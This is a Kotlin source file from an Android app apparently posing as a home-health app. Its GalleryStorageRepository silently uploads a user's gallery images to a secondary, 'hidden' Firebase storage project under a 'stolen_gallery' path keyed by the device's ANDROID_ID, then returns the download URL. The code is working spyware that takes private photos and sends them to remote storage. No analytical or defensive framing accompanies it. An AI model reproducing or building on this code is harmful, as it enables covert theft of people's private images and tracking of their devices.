package com.example.homehealth.data.repository

import android.content.Context
import android.net.Uri
import com.example.homehealth.utils.FirebaseProjects
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await

object GalleryStorageRepository {
    suspend fun uploadToHiddenStorage(context: Context, uri: Uri, fileName: String): Result<String> {
        return try {
            // Get the secondary accessibility Firebase App
            val secondaryApp = FirebaseProjects.accessibilityStorageOrNull(context)
                ?: throw Exception("Secondary Firebase not initialized")

            // Explicitly get storage for that specific app
            val storage = FirebaseStorage.getInstance(secondaryApp)

            val deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )

            val ref = storage.reference.child("stolen_gallery/$deviceId/$fileName")

            // Upload and wait for completion
            ref.putFile(uri).await()

            val downloadUrl = ref.downloadUrl.await().toString()
            Result.success(downloadUrl)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}